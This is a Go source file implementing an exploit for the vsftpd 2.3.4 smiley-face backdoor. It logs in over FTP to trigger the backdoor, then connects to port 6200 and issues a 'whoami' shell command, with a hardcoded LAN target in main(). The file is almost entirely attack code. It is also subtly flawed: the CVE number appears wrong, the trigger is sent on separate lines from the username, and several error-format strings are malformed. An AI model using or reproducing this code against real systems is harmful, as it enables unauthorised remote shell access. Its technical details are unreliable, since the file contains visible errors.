package main

import (
	"fmt"
	"net"
	"time"
)

// Exploit is a generic interface for exploit modules
type Exploit interface {
	Run(Target string) error
}

// VsftpdExploit implement exploit for CVE-2011-2023
type VsftpdExploit struct {
	ftpPort      string // FTP port (default: 21)
	backdoorPort string // Backdoor port is 6200
}

// NewVsftpdExploit create an instance of the Exploit
func NewVsftpdExploit(ftpPort, backdoorPort string) *VsftpdExploit {
	return &VsftpdExploit{
		ftpPort:      ftpPort,
		backdoorPort: backdoorPort,
	}
}

// Run the exploit agaist target
func (e *VsftpdExploit) Run(target string) error {
	// Step 1 : Connect to port FTP (21)
	ftpAddr := fmt.Sprintf("%s:%s", target, e.ftpPort)
	conn, err := net.DialTimeout("tcp", ftpAddr, 5*time.Second)
	if err != nil {
		return fmt.Errorf("failed to connect to FTP %s: %v, ftpAddr, err")
	}
	defer conn.Close()

	// Read FTP Banner
	buffer := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buffer)
	if err != nil {
		return fmt.Errorf("failed to read FTP banner: %v, err")
	}
	fmt.Printf("FTP Banner: %s\n", string(buffer[:n]))

	// Send username and password
	payload := "USER\n"
	_, err = conn.Write([]byte(payload))
	if err != nil {
		return fmt.Errorf("Failed to send payload: %v", err)
	}

	payload2 := ":)\n" //password
	_, err = conn.Write([]byte(payload2))
	if err != nil {
		return fmt.Errorf("Failes to send payload: %v", err)
	}

	// Read response
	n, err = conn.Read(buffer)
	if err != nil {
		return fmt.Errorf("Failed to read reponse: %v", err)
	}
	fmt.Printf("Response: %s\n", string(buffer[:n]))

	// Send a string to test (Simulated) #NotNecessary
	_, err = conn.Write([]byte("PASS dummy\n"))
	if err != nil {
		return fmt.Errorf("Failed to send message: %v", err)
	}

	// wait for the backdoor to open to gain shell access (Port 6200)
	time.Sleep(2 * time.Second)

	// Connect to port 6200 (shell)
	backdoorAddr := fmt.Sprintf("%s:%s", target, e.backdoorPort)
	shellConn, err := net.DialTimeout("tcp", backdoorAddr, 5*time.Second)
	if err != nil {
		return fmt.Errorf("Failed to connect to backdoor %s; %v", backdoorAddr, err)
	}
	defer shellConn.Close()
	fmt.Printf("Connected to remote shell backdoor on port 6200")

	// Interact with shell
	shellConn.Write([]byte("whoami\n"))
	n, err = shellConn.Read(buffer)
	if err != nil {
		return fmt.Errorf("Failed to read shell %v", string(buffer[:n]))
	}

	return nil
}

func main() {
	target := "192.168.88.112"
	exploit := NewVsftpdExploit("21", "6200")
	err := exploit.Run(target)
	if err != nil {
		fmt.Printf("Error during exploit: %v\n", err)
	}
}
